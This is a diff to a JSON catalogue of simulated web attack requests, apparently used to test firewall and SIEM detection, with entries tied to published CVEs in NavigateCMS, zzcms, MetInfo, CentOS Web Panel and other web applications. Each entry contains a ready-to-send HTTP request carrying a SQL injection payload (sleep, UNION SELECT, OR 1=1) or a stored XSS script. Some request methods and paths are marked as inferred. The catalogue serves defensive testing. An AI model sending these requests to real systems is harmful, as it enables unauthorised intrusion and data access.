@@ -426817,6 +426817,320 @@
     "visible": true
   },
   {
+    "name": "CVE-2020-23711 - NavigateCMS 2.9 SQL Injection",
+    "displayName": "CVE-2020-23711 - NavigateCMS 2.9 SQL Injection",
+    "description": "NavigateCMS 2.9 is vulnerable to blind SQL injection via the URL-encoded GET parameter 'category' in navigate.php (act=items_order). The request sends a time-based SQL injection payload (sleep) in 'category'. No vendor WAF rule found; built from the PoC (GitHub issue #20).\n\nReferences used to recreate this request:\n- https://github.com/NavigateCMS/Navigate-CMS/issues/20 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-23711 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /navigate/navigate.php?act=items_order&category=%28select%280%29from%28select%28sleep%285%29%29v%29&fid=items HTTP/1.1\nHost: {{target_host}}\nCookie: navigate-user=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-23711"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-23711",
+        "link": "https://github.com/NavigateCMS/Navigate-CMS/issues/20"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-23685 - 188Jianzhan 2.1.0 Stored Cross-Site Scripting",
+    "displayName": "CVE-2020-23685 - 188Jianzhan 2.1.0 Stored Cross-Site Scripting",
+    "description": "188Jianzhan v2.1.0 stores the registration 'user' parameter without sanitization, leading to stored XSS rendered in the admin panel (/admin/userlist.php). This request sends the storing request to /admin/reg.php with a script payload in 'user'. NOTE: the CVE is labelled SQL injection (login.php), but the only linked PoC (GitHub issue #2) demonstrates stored XSS via /admin/reg.php; per the PoC-is-source-of-truth rule the request simulates the confirmed XSS. Method POST inferred (registration save). No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/vtime-tech/188Jianzhan/issues/2 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-23685 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/reg.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nuser=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&pwd=dummy\n"
+    },
+    "cves": [
+      "CVE-2020-23685"
+    ],
+    "cwes": [
+      "CWE-79"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-79",
+      "Cross-Site Scripting"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-23685",
+        "link": "https://github.com/vtime-tech/188Jianzhan/issues/2"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-23630 - zzcms 201910 SQL Injection",
+    "displayName": "CVE-2020-23630 - zzcms 201910 SQL Injection",
+    "description": "zzcms ver201910 is vulnerable to blind (time-based) SQL injection via the 'PassWord' cookie value, which /user/check.php (included by /user/daohang_company.php) places into a query unfiltered. This request sends the injection in the PassWord cookie; refreshing the page triggers it. No vendor WAF rule found; built from the PoC (GitHub issue #1).\n\nReferences used to recreate this request:\n- https://github.com/Pandora1m2/zzcms201910/issues/1 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-23630 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /user/daohang_company.php HTTP/1.1\nHost: {{target_host}}\nCookie: UserName=dummy; PassWord=e10adc3949ba59abbe56e057f20f883e' && if(1=1,sleep(5),0)-- -\n\n"
+    },
+    "cves": [
+      "CVE-2020-23630"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-23630",
+        "link": "https://github.com/Pandora1m2/zzcms201910/issues/1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-23262 - MingSoft MCMS 5.0 SQL Injection",
+    "displayName": "CVE-2020-23262 - MingSoft MCMS 5.0 SQL Injection",
+    "description": "MingSoft MCMS v5.0 is vulnerable to unauthenticated SQL injection via the 'orderby' parameter of /mcms/view.do, which is concatenated into an ORDER BY clause (${orderBy}) unsanitized. The request sends a stacked sub-select sleep payload in 'orderby'. Method GET is confirmed by the @GetMapping(\"/view.do\") handler. No vendor WAF rule found; built from the PoC (GitHub issue #45).\n\nReferences used to recreate this request:\n- https://github.com/ming-soft/MCMS/issues/45 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-23262 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /mcms/view.do?id=71&orderby=cms_content.id%2C%28select%2Afrom%28select%28sleep%285%29%29a%29&order=ASC HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2020-23262"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-23262",
+        "link": "https://github.com/ming-soft/MCMS/issues/45"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-23149 - rConfig 3.9.5 SQL Injection",
+    "displayName": "CVE-2020-23149 - rConfig 3.9.5 SQL Injection",
+    "description": "rConfig 3.9.5 does not sanitize the 'dbName' GET parameter in install/lib/ajaxHandlers/ajaxDbInstall.php, allowing unauthenticated SQL injection during installation. The request sends a time-based payload in 'dbName' (the handler also expects server, port, dbUsername and dbPassword). No vendor WAF rule found; built from the source/PoC.\n\nReferences used to recreate this request:\n- https://github.com/rconfig/rconfig/blob/7ef8bd8d606bc10835e1b8f6f72a2048094816d3/www/install/lib/ajaxHandlers/ajaxDbInstall.php#L35 (PoC/source)\n- https://www.cve.org/CVERecord?id=CVE-2020-23149 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /install/lib/ajaxHandlers/ajaxDbInstall.php?server=localhost&port=3306&dbName=rconfig%27%20AND%20SLEEP%285%29--%20-&dbUsername=root&dbPassword=dummy HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2020-23149"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-23149",
+        "link": "https://github.com/rconfig/rconfig/blob/7ef8bd8d606bc10835e1b8f6f72a2048094816d3/www/install/lib/ajaxHandlers/ajaxDbInstall.php#L35"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-22820 - MKCMS 6.2 SQL Injection",
+    "displayName": "CVE-2020-22820 - MKCMS 6.2 SQL Injection",
+    "description": "MKCMS V6.2 is vulnerable to SQL injection via the 'name' parameter of /ucenter/repass.php. The request sends a boolean SQL injection payload in 'name'. Method GET inferred (password-recovery lookup by name). No vendor WAF rule found; built from the advisory.\n\nReferences used to recreate this request:\n- https://unc1e.blogspot.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2020-22820 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ucenter/repass.php?name=1%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2020-22820"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory for CVE-2020-22820",
+        "link": "https://unc1e.blogspot.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-22819 - MKCMS 6.2 SQL Injection",
+    "displayName": "CVE-2020-22819 - MKCMS 6.2 SQL Injection",
+    "description": "MKCMS V6.2 is vulnerable to SQL injection via the 'verify' parameter of /ucenter/active.php. The request sends a boolean SQL injection payload in 'verify'. Method GET inferred (account-activation verification). No vendor WAF rule found; built from the advisory.\n\nReferences used to recreate this request:\n- https://unc1e.blogspot.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2020-22819 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ucenter/active.php?verify=1%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2020-22819"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory for CVE-2020-22819",
+        "link": "https://unc1e.blogspot.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-4784 - code-projects Simple Laundry System SQL Injection",
     "displayName": "CVE-2026-4784 - code-projects Simple Laundry System SQL Injection",
     "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the serviceId parameter of /checkcheckout.php (Parameter Handler). The request sends a time-based blind SQLi payload (AND SLEEP(5)) in serviceId, matching OWASP CRS 942 (SQLi). No vendor WAF rule or nuclei template was found; the GitHub PoC was unreachable (provenance-blocked), so the entry point is taken from the VulDB/NVD advisory and the GET method is INFERRED from the id-style serviceId argument (flagged).\n\nReferences used to recreate this request:\n- https://github.com/zzb1388/cve2/issues/1 (PoC, unreachable)\n- https://vuldb.com/?id.352801 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4784 (CVE record)",
@@ -427922,6 +428236,364 @@
     "visible": true
   },
   {
+    "name": "CVE-2020-21131 - MetInfo 7.0.0 beta SQL Injection",
+    "displayName": "CVE-2020-21131 - MetInfo 7.0.0 beta SQL Injection",
+    "description": "MetInfo 7.0.0 beta is vulnerable to SQL injection in the langconfig query parameter of the admin doAddLanguage action (admin/?n=language&c=language_web&a=doAddLanguage). The request sends a UNION SELECT ... SLEEP(10) payload in langconfig. Method and full multipart body taken from the public PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/SZFsir/tmpProject/issues/3 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-21131 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/?n=language&c=language_web&a=doAddLanguage&langconfig=1%20union%20select%201,2,3,4,sleep(10)%23 HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=----cym\nCookie: PHPSESSID=dummy; met_auth=dummy; admin_lang=cn\n\n------cym\nContent-Disposition: form-data; name=\"order\"\n\n999\n------cym\nContent-Disposition: form-data; name=\"name\"\n\nqqqq\n------cym\nContent-Disposition: form-data; name=\"flag\"\n\ncn.gif\n------cym\nContent-Disposition: form-data; name=\"mark\"\n\n888\n------cym\nContent-Disposition: form-data; name=\"submit_type\"\n\nsave\n------cym--\n"
+    },
+    "cves": [
+      "CVE-2020-21131"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21131",
+        "link": "https://github.com/SZFsir/tmpProject/issues/3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21127 - MetInfo 7.0.0 SQL Injection",
+    "displayName": "CVE-2020-21127 - MetInfo 7.0.0 SQL Injection",
+    "description": "MetInfo 7.0.0 is vulnerable to blind SQL injection in the id parameter of the admin logs dodel action (admin/?n=logs&c=index&a=dodel), handled in logs/index.class.php. The request sends a time-based 'id[0]=123 and sleep(5)' payload in the POST body. Method and body taken from the public PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/T3qui1a/metinfo_sqlinjection/issues/1 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-21127 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/?n=logs&c=index&a=dodel HTTP/1.1\nHost: {{target_host}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: PHPSESSID=dummy; met_auth=dummy; admin_lang=cn\n\nid%5B0%5D=123+and+sleep(5)\n"
+    },
+    "cves": [
+      "CVE-2020-21127"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21127",
+        "link": "https://github.com/T3qui1a/metinfo_sqlinjection/issues/1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21121 - Pligg CMS 2.0.2 SQL Injection",
+    "displayName": "CVE-2020-21121 - Pligg CMS 2.0.2 SQL Injection",
+    "description": "Pligg CMS 2.0.2 contains a time-based SQL injection in the recordIDValue parameter of admin_update_module_widgets.php (value not wrapped in quotes / not sanitised, per the PoC). The request sends 'recordIDValue=1 AND SLEEP(5)'. Method POST and the /admin/ path prefix are INFERRED (admin update action); the vulnerable file and parameter are confirmed by the PoC. No vendor WAF rule found; built from the PoC.\n\nReferences used to recreate this request:\n- https://github.com/Kliqqi-CMS/Kliqqi-CMS/issues/259 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-21121 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin/admin_update_module_widgets.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nrecordIDValue=1+AND+SLEEP(5)\n"
+    },
+    "cves": [
+      "CVE-2020-21121"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21121",
+        "link": "https://github.com/Kliqqi-CMS/Kliqqi-CMS/issues/259"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21378 - SeaCMS 10.1 SQL Injection",
+    "displayName": "CVE-2020-21378 - SeaCMS 10.1 SQL Injection",
+    "description": "SeaCMS 10.1 (2020.02.08) is vulnerable to SQL injection via the id parameter in the edit action of admin_members_group.php. The request sends a UNION SELECT payload in id. Method GET and action=edit are INFERRED from the CVE description (edit-by-id action); the admin file and the id parameter are from the CVE/PoC. No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://github.com/hackxf/cms_vul/blob/master/SeacmsSQL.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-21378 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin_members_group.php?action=edit&id=-1%20union%20select%201,2,3,database(),5,6,7,8--+ HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-21378"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21378",
+        "link": "https://github.com/hackxf/cms_vul/blob/master/SeacmsSQL.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21152 - inxedu 2.0.6 SQL Injection",
+    "displayName": "CVE-2020-21152 - inxedu 2.0.6 SQL Injection",
+    "description": "inxedu 2.0.6 is vulnerable to SQL injection via the functionIds parameter sent to /saverolefunction. The request sends a time-based 'functionIds=1 AND SLEEP(5)' payload. Method POST is INFERRED (save action); the path and parameter are from the CVE description. No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://gitee.com/inxeduopen/inxedu/issues/I14DNG (advisory/issue)\n- http://8sec.cc/index.php/archives/330/ (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2020-21152 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /saverolefunction HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\nfunctionIds=1+AND+SLEEP(5)\n"
+    },
+    "cves": [
+      "CVE-2020-21152"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_gitee for CVE-2020-21152",
+        "link": "https://gitee.com/inxeduopen/inxedu/issues/I14DNG"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21120 - UQCMS 2.1.3 SQL Injection",
+    "displayName": "CVE-2020-21120 - UQCMS 2.1.3 SQL Injection",
+    "description": "UQCMS 2.1.3 is vulnerable to SQL injection via the cookie_cart cookie parameter handled in home/controls/cart.class.php, reached at /index.php/cart/num. The request sends a UNION SELECT payload in the cookie_cart cookie. Method GET is INFERRED (cart num read action); path and parameter are from the CVE description. No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://github.com/alixiaowei/cve_test/issues/3 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-21120 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /index.php/cart/num HTTP/1.1\nHost: {{target_host}}\nCookie: cookie_cart=-1%20union%20select%201,2,3,4,5,6,7,8,9,10--+\n\n"
+    },
+    "cves": [
+      "CVE-2020-21120"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21120",
+        "link": "https://github.com/alixiaowei/cve_test/issues/3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21179 - koa2-blog 1.0.0 SQL Injection",
+    "displayName": "CVE-2020-21179 - koa2-blog 1.0.0 SQL Injection",
+    "description": "koa2-blog 1.0.0 is vulnerable to SQL injection via the name parameter on the signin page. The request sends a \"' OR 1=1-- -\" payload in name. The /signin route and POST method are INFERRED from the named signin page; the name parameter and attack class are from the CVE description (PoC issue inaccessible). No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://github.com/wclimb/Koa2-blog/issues/40 (PoC, inaccessible)\n- https://www.cve.org/CVERecord?id=CVE-2020-21179 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /signin HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nname=admin'+OR+1=1--+-&password=dummy\n"
+    },
+    "cves": [
+      "CVE-2020-21179"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21179",
+        "link": "https://github.com/wclimb/Koa2-blog/issues/40"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-21180 - koa2-blog 1.0.0 SQL Injection",
+    "displayName": "CVE-2020-21180 - koa2-blog 1.0.0 SQL Injection",
+    "description": "koa2-blog 1.0.0 is vulnerable to SQL injection via the name parameter on the signup page. The request sends a \"' OR 1=1-- -\" payload in name. The /signup route and POST method are INFERRED from the named signup page; the name parameter and attack class are from the CVE description (PoC issue inaccessible). No vendor WAF rule found; built from the CVE description.\n\nReferences used to recreate this request:\n- https://github.com/wclimb/Koa2-blog/issues/41 (PoC, inaccessible)\n- https://www.cve.org/CVERecord?id=CVE-2020-21180 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /signup HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nname=admin'+OR+1=1--+-&password=dummy&email=a%40a.com\n"
+    },
+    "cves": [
+      "CVE-2020-21180"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-21180",
+        "link": "https://github.com/wclimb/Koa2-blog/issues/41"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-4632 - itsourcecode Online Enrollment System SQL Injection",
     "displayName": "CVE-2026-4632 - itsourcecode Online Enrollment System SQL Injection",
     "description": "itsourcecode Online Enrollment System 1.0 is vulnerable to SQL injection via the 'Name' argument of the add-user handler at /sms/user/index.php?view=add. The request sends a boolean SQL injection payload in Name. No vendor WAF rule found; built from the VulDB entry. METHOD INFERRED: POST (add-form action) per spec guidance, as the PoC request body was not reachable.\n\nReferences used to recreate this request:\n- https://github.com/chuxina7-aiguo/CVE1/issues/1 (PoC)\n- https://vuldb.com/?id.352499 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4632 (CVE record)",
@@ -428424,6 +429096,456 @@
       {
         "title": "vuldb for CVE-2026-4581",
         "link": "https://vuldb.com/vuln/352418"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15622 - CentOS Web Panel ajax_mail_autoreply.php SQL Injection",
+    "displayName": "CVE-2020-15622 - CentOS Web Panel ajax_mail_autoreply.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the search parameter of ajax_mail_autoreply.php, which is used unsanitized to build a SQL query (executes in the context of root per ZDI-20-769). The request sends a UNION SELECT payload in the search parameter (OWASP CRS 942). HTTP method inferred as GET (search/list endpoint); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-769/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15622 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_mail_autoreply.php?search=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15622"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15622",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-769/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15621 - CentOS Web Panel ajax_mail_autoreply.php SQL Injection",
+    "displayName": "CVE-2020-15621 - CentOS Web Panel ajax_mail_autoreply.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the email parameter of ajax_mail_autoreply.php (executes in the context of root per ZDI-20-768). The request sends a UNION SELECT payload in the email parameter (OWASP CRS 942). HTTP method inferred as GET; path is the file named by the ZDI advisory. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-768/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15621 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_mail_autoreply.php?email=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15621"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_zdi for CVE-2020-15621",
+        "link": "https://www.zerodayinitiative.com/advisories/ZDI-20-768/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-15620 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "displayName": "CVE-2020-15620 - CentOS Web Panel ajax_list_accounts.php SQL Injection",
+    "description": "CentOS Web Panel cwp-e17.0.9.8.923 is vulnerable to unauthenticated SQL injection in the id parameter of ajax_list_accounts.php, used unsanitized to build a SQL query (executes in the context of root per ZDI-20-767). The request sends a UNION SELECT payload in the id parameter (OWASP CRS 942). HTTP method inferred as GET (account-listing filter); path is the file named by the ZDI advisory (install folder not specified). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.zerodayinitiative.com/advisories/ZDI-20-767/ (ZDI advisory / entry point)\n- https://www.cve.org/CVERecord?id=CVE-2020-15620 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /ajax_list_accounts.php?id=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-15620"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
